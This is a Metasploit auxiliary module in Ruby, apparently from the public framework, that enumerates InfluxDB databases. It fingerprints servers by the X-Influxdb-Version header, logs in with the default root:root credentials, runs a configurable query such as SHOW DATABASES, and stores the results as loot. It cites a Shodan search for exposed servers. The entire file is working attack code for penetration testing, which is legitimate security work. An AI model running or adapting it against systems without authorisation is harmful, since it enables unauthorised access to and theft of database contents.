##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'InfluxDB Enum Utility',
      'Description'    => %q{
        This module enumerates databases on InfluxDB using the REST API using the
        default authentication of root:root.
      },
      'References'     =>
        [
          ['URL', 'https://docs.influxdata.com/influxdb/'],
          ['URL', 'https://www.shodan.io/search?query=X-Influxdb-Version']
        ],
      'Author'         =>
        [
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>',
          'Nixawk'
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(8086),
        OptString.new('TARGETURI', [true, 'Path to list all the databases', '/']),
        OptString.new('USERNAME', [true, 'The username to login as', 'root']),
        OptString.new('PASSWORD', [true, 'The password to login with', 'root']),
        OptString.new('QUERY', [true, 'The influxdb query syntax', 'SHOW DATABASES'])
      ])
  end

  def run
    begin
      # Check the target if is a influxdb server
      res = send_request_cgi(
        'uri'    => normalize_uri(target_uri.path),
        'method' => 'GET'
      )

      return if res.nil?
      return if res.headers['X-Influxdb-Version'].nil?

      print_good("#{peer} - Influx Version: #{res.headers['X-Influxdb-Version']}")

      # Send http auth to the target
      # curl http://127.0.0.1:8086/query?q=SHOW+DATABASES
      # curl -X POST http://127.0.0.1:8086/query --data 'q=SHOW DATABASES'
      res = send_request_cgi(
        'uri'           => normalize_uri(target_uri.path, '/query'),
        'method'        => 'GET',
        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
        'vars_get'      => {
          'q'           => datastore['QUERY']
        }
      )

      return if res.nil?
      return if res.headers['X-Influxdb-Version'].nil?

      # Check http auth status
      case res.code
      when 401
        fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate. Invalid username/password.")
      when 200

        begin
          jsonres = JSON.parse(res.body)
          return if jsonres.nil?
          return if jsonres['results'].nil?

          result = JSON.pretty_generate(jsonres)
          vprint_good("#{peer} - Influx DB Found:\n\n#{result}\n")
          path = store_loot(
            'influxdb.enum',
            'text/plain',
            rhost,
            result,
            'InfluxDB Enum'
          )
          print_good("File saved in: #{path}")
        rescue JSON::ParserError
          fail_with(Failure::Unknown, "#{peer} - Unexpected response, cannot parse JSON")
        end

      else
        fail_with(Failure::Unknown, "#{peer} - Unexpected response status #{res.code}")
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the influx db server.")
    end
  end
end
